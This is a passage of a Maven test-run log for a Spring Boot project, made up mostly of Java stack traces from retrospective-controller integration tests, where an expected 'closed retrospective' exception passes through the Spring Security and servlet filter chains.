	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroItemTests.cannotAddItemToClosedRetro(RetroControllerIntegrationTest.java:396) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.050 s -- in com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroItemTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.RetroControllerIntegrationTest$RetroStatusTests
2026-01-17T23:26:46.926Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Cannot open a closed retrospective

java.lang.IllegalStateException: Cannot open a closed retrospective
	at com.github.farzadsedaghatbin.shipflow.service.RetroService.openRetro(RetroService.java:133) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RetroService$$SpringCGLIB$$0.openRetro(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController.openRetro(RetroController.java:68) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:713) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.RetroController$$SpringCGLIB$$0.openRetro(<generated>) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
